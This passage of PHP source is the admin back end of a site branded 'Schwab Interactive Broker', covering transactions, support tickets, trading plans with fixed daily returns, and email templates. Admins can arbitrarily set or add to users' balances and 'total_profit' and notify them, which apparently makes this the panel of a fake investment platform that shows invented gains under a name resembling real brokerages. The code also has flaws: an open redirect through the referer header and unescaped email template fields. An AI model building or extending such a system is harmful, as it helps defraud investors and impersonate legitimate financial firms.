    $tickets->execute([$id]);
    $tickets = $tickets->fetchAll();

    $emailLogs = $pdo->prepare("SELECT * FROM email_logs WHERE user_id=? ORDER BY sent_at DESC LIMIT 10");
    $emailLogs->execute([$id]);
    $emailLogs = $emailLogs->fetchAll();

    $msg = flash('success');
    $err = flash('error');
    view('admin/user_detail', compact('user','txs','plans','tickets','emailLogs','msg','err'));
}

function adminTransactions(): void {
    requireAdmin();
    $pdo    = getDbConnection();
    $filter = $_GET['status'] ?? 'all';
    if ($filter === 'all') {
        $txs = $pdo->query("SELECT t.*,u.full_name,u.email FROM transactions t JOIN users u ON t.user_id=u.id ORDER BY t.created_at DESC")->fetchAll();
    } else {
        $stmt = $pdo->prepare("SELECT t.*,u.full_name,u.email FROM transactions t JOIN users u ON t.user_id=u.id WHERE t.status=? ORDER BY t.created_at DESC");
        $stmt->execute([$filter]);
        $txs = $stmt->fetchAll();
    }
    $msg = flash('success');
    $err = flash('error');
    view('admin/transactions', compact('txs','filter','msg','err'));
}

function adminPlans(): void {
    requireAdmin();
    $pdo   = getDbConnection();
    $plans = $pdo->query("SELECT * FROM trading_plans ORDER BY min_amount")->fetchAll();
    $msg   = flash('success');
    $err   = flash('error');
    view('admin/plans', compact('plans','msg','err'));
}

function adminTickets(): void {
    requireAdmin();
    $pdo     = getDbConnection();
    $filter  = $_GET['status'] ?? 'all';
    if ($filter === 'all') {
        $tickets = $pdo->query("SELECT st.*,u.full_name,u.email FROM support_tickets st JOIN users u ON st.user_id=u.id ORDER BY st.created_at DESC")->fetchAll();
    } else {
        $stmt = $pdo->prepare("SELECT st.*,u.full_name,u.email FROM support_tickets st JOIN users u ON st.user_id=u.id WHERE st.status=? ORDER BY st.created_at DESC");
        $stmt->execute([$filter]);
        $tickets = $stmt->fetchAll();
    }
    view('admin/tickets', compact('tickets','filter'));
}

function adminTicketDetail(int $id): void {
    requireAdmin();
    $pdo    = getDbConnection();
    $stmt   = $pdo->prepare("SELECT st.*,u.full_name,u.email FROM support_tickets st JOIN users u ON st.user_id=u.id WHERE st.id=?");
    $stmt->execute([$id]);
    $ticket = $stmt->fetch();
    if (!$ticket) { http_response_code(404); view('404'); return; }
    $msg = flash('success');
    view('admin/ticket_detail', compact('ticket','msg'));
}

function adminEmailLogs(): void {
    requireAdmin();
    $pdo  = getDbConnection();
    $logs = $pdo->query("SELECT el.*,u.full_name FROM email_logs el LEFT JOIN users u ON el.user_id=u.id ORDER BY el.sent_at DESC LIMIT 100")->fetchAll();
    view('admin/email_logs', compact('logs'));
}

function adminNotificationsPage(): void {
    requireAdmin();
    $pdo   = getDbConnection();
    $users = $pdo->query("SELECT id,full_name,email FROM users WHERE role='user' ORDER BY full_name")->fetchAll();
    $msg   = flash('success');
    view('admin/notifications', compact('users','msg'));
}

// ─────────────────────────────────────────────────────────────────────────────
//  ADMIN ACTIONS (POST)
// ─────────────────────────────────────────────────────────────────────────────

function adminTxAction(): void {
    requireAdmin();
    $txId   = (int)($_POST['tx_id'] ?? 0);
    $action = $_POST['action'] ?? '';
    if (!in_array($action,['approve','reject'])) { redirect('/admin/transactions'); }

    $pdo  = getDbConnection();
    $stmt = $pdo->prepare("SELECT * FROM transactions WHERE id=?");
    $stmt->execute([$txId]);
    $tx = $stmt->fetch();
    if (!$tx) { redirect('/admin/transactions'); }

    if ($action === 'approve' && $tx['status'] === 'pending') {
        $pdo->prepare("UPDATE transactions SET status='approved' WHERE id=?")->execute([$txId]);
        if ($tx['type'] === 'deposit') {
            $pdo->prepare("UPDATE users SET balance=balance+? WHERE id=?")->execute([$tx['amount'],$tx['user_id']]);
        }
        $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
            ->execute([$tx['user_id'],'Transaction Approved',"Your ".ucfirst($tx['type'])." of ".formatMoney($tx['amount'])." has been approved and processed."]);
        flash('success','Transaction approved successfully.');
    } elseif ($action === 'reject' && $tx['status'] === 'pending') {
        $pdo->prepare("UPDATE transactions SET status='rejected' WHERE id=?")->execute([$txId]);
        if ($tx['type'] === 'withdrawal') {
            $pdo->prepare("UPDATE users SET balance=balance+?,withdrawals=withdrawals-? WHERE id=?")->execute([$tx['amount'],$tx['amount'],$tx['user_id']]);
        }
        $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
            ->execute([$tx['user_id'],'Transaction Rejected',"Your ".ucfirst($tx['type'])." of ".formatMoney($tx['amount'])." was not approved. Contact support for more info."]);
        flash('success','Transaction rejected.');
    }

    $referer = $_SERVER['HTTP_REFERER'] ?? '/admin/transactions';
    redirect($referer);
}

function adminUserToggle(): void {
    requireAdmin();
    $id = (int)($_POST['user_id'] ?? 0);
    $pdo = getDbConnection();
    $stmt = $pdo->prepare("SELECT is_active FROM users WHERE id=?");
    $stmt->execute([$id]);
    $u = $stmt->fetch();
    if ($u) {
        $new = $u['is_active'] ? 0 : 1;
        $pdo->prepare("UPDATE users SET is_active=? WHERE id=?")->execute([$new,$id]);
        flash('success', $new ? 'User activated.' : 'User deactivated.');
    }
    redirect('/admin/users');
}

function adminUpdateBalance(): void {
    requireAdmin();
    $userId  = (int)($_POST['user_id'] ?? 0);
    $field   = $_POST['field'] ?? 'balance';
    $amount  = (float)($_POST['amount'] ?? 0);
    $op      = $_POST['op'] ?? 'set';

    $allowed = ['balance','total_profit','bonus','referral_bonus','withdrawals'];
    if (!in_array($field, $allowed)) { flash('error','Invalid field.'); redirect('/admin/users/'.$userId); }

    $pdo = getDbConnection();
    if ($op === 'add') {
        $pdo->prepare("UPDATE users SET $field=$field+?,updated_at=NOW() WHERE id=?")->execute([$amount,$userId]);
    } elseif ($op === 'subtract') {
        $pdo->prepare("UPDATE users SET $field=GREATEST(0,$field-?),updated_at=NOW() WHERE id=?")->execute([$amount,$userId]);
    } else {
        $pdo->prepare("UPDATE users SET $field=?,updated_at=NOW() WHERE id=?")->execute([$amount,$userId]);
    }

    $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
        ->execute([$userId,'Account Updated',"Your ".str_replace('_',' ',$field)." has been updated by admin."]);

    flash('success','Balance updated successfully.');
    redirect('/admin/users/'.$userId);
}

function adminSendEmail(): void {
    requireAdmin();
    $userId  = (int)($_POST['user_id'] ?? 0);
    $subject = trim($_POST['subject'] ?? '');
    $body    = trim($_POST['body'] ?? '');

    if (!$subject || !$body) { flash('error','Subject and message are required.'); redirect('/admin/users/'.$userId); }

    $pdo  = getDbConnection();
    $stmt = $pdo->prepare("SELECT full_name,email FROM users WHERE id=?");
    $stmt->execute([$userId]);
    $user = $stmt->fetch();
    if (!$user) { flash('error','User not found.'); redirect('/admin/users'); }

    $html = emailTemplate($subject, "<p>" . nl2br(htmlspecialchars($body)) . "</p>", $user['full_name']);
    $sent = sendMail($user['email'], $subject, $html);

    $pdo->prepare("INSERT INTO email_logs (user_id,to_email,subject,body) VALUES (?,?,?,?)")
        ->execute([$userId,$user['email'],$subject,$body]);
    $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
        ->execute([$userId,'Message from Support',$body]);

    flash('success',$sent ? 'Email sent successfully.' : 'Email queued (mail() may be disabled on this server).');
    redirect('/admin/users/'.$userId);
}

function adminRestrictUser(): void {
    requireAdmin();
    $userId = (int)($_POST['user_id'] ?? 0);
    $action = $_POST['action'] ?? 'restrict';

    $pdo = getDbConnection();
    $new = $action === 'restrict' ? 1 : 0;
    $pdo->prepare("UPDATE users SET is_restricted=? WHERE id=?")->execute([$new,$userId]);

    $msg = $new ? 'Your account has been restricted. Please contact support.' : 'Your account restriction has been lifted.';
    $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
        ->execute([$userId,'Account Status Update',$msg]);

    flash('success',$new ? 'User restricted.' : 'User restriction removed.');
    redirect('/admin/users/'.$userId);
}

function adminAddNotification(): void {
    requireAdmin();
    $userId  = (int)($_POST['user_id'] ?? 0);
    $title   = trim($_POST['title'] ?? '');
    $message = trim($_POST['message'] ?? '');
    $sendAll = !empty($_POST['send_all']);

    if (!$title || !$message) { flash('error','Title and message required.'); redirect('/admin/notifications'); }

    $pdo = getDbConnection();
    if ($sendAll) {
        $users = $pdo->query("SELECT id FROM users WHERE role='user'")->fetchAll();
        foreach ($users as $u) {
            $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")->execute([$u['id'],$title,$message]);
        }
        flash('success','Notification sent to all users.');
    } else {
        if (!$userId) { flash('error','Please select a user.'); redirect('/admin/notifications'); }
        $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")->execute([$userId,$title,$message]);
        flash('success','Notification sent.');
    }
    redirect('/admin/notifications');
}

function adminReplyTicket(): void {
    requireAdmin();
    $ticketId = (int)($_POST['ticket_id'] ?? 0);
    $reply    = trim($_POST['reply'] ?? '');
    $status   = $_POST['status'] ?? 'closed';

    if (!$reply) { flash('error','Reply cannot be empty.'); redirect('/admin/tickets/'.$ticketId); }

    $pdo = getDbConnection();
    $pdo->prepare("UPDATE support_tickets SET reply=?,status=?,replied_at=NOW() WHERE id=?")->execute([$reply,$status,$ticketId]);
    $stmt = $pdo->prepare("SELECT user_id,subject FROM support_tickets WHERE id=?");
    $stmt->execute([$ticketId]);
    $ticket = $stmt->fetch();
    if ($ticket) {
        $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
            ->execute([$ticket['user_id'],'Support Reply',"Your ticket '{$ticket['subject']}' has been answered: $reply"]);
    }
    flash('success','Reply sent.');
    redirect('/admin/tickets/'.$ticketId);
}

function adminAddPlan(): void {
    requireAdmin();
    $name     = trim($_POST['name'] ?? '');
    $min      = (float)($_POST['min_amount'] ?? 0);
    $max      = (float)($_POST['max_amount'] ?? 0);
    $daily    = (float)($_POST['daily_return'] ?? 0);
    $duration = (int)($_POST['duration_days'] ?? 0);
    $desc     = trim($_POST['description'] ?? '');

    if (!$name || !$min || !$max || !$daily || !$duration) { flash('error','All plan fields required.'); redirect('/admin/plans'); }

    $pdo = getDbConnection();
    $pdo->prepare("INSERT INTO trading_plans (name,min_amount,max_amount,daily_return,duration_days,description) VALUES (?,?,?,?,?,?)")
        ->execute([$name,$min,$max,$daily,$duration,$desc]);
    flash('success','Plan added successfully.');
    redirect('/admin/plans');
}

function adminTogglePlan(): void {
    requireAdmin();
    $id = (int)($_POST['plan_id'] ?? 0);
    $pdo = getDbConnection();
    $pdo->exec("UPDATE trading_plans SET is_active = NOT is_active WHERE id=$id");
    flash('success','Plan status updated.');
    redirect('/admin/plans');
}

// ─────────────────────────────────────────────────────────────────────────────
//  EMAIL TEMPLATE
// ─────────────────────────────────────────────────────────────────────────────
function emailTemplate(string $title, string $content, string $userName = ''): string {
    $greeting = $userName ? "Dear {$userName}," : "Dear Investor,";
    return "<!DOCTYPE html>
<html>
<head><meta charset='UTF-8'><title>{$title}</title></head>
<body style='margin:0;padding:0;background:#0a0d1f;font-family:Arial,sans-serif;'>
<table width='100%' cellpadding='0' cellspacing='0' style='background:#0a0d1f;padding:30px 0;'>
<tr><td align='center'>
<table width='600' cellpadding='0' cellspacing='0' style='background:#111735;border-radius:12px;overflow:hidden;'>
<tr><td style='background:linear-gradient(135deg,#00d4c8,#006d6b);padding:30px;text-align:center;'>
<h1 style='color:#fff;margin:0;font-size:24px;'>Schwab Interactive Broker</h1>
<p style='color:rgba(255,255,255,.8);margin:5px 0 0;font-size:13px;'>schwabinteractivebroker.com</p>
</td></tr>
<tr><td style='padding:40px;color:#e8eaf6;'>
<p style='margin:0 0 20px;font-size:15px;'>{$greeting}</p>
{$content}
<hr style='border:none;border-top:1px solid #1e2555;margin:30px 0;'>
<p style='color:#8892b0;font-size:12px;margin:0;'>This is an automated message from Schwab Interactive Broker. Please do not reply to this email.</p>
</td></tr>
<tr><td style='background:#0d1232;padding:20px;text-align:center;'>
<p style='color:#8892b0;font-size:12px;margin:0;'>© ".date('Y')." Schwab Interactive Broker. All rights reserved.</p>
</td></tr>
</table>
</td></tr>
</table>
</body>
</html>";
}
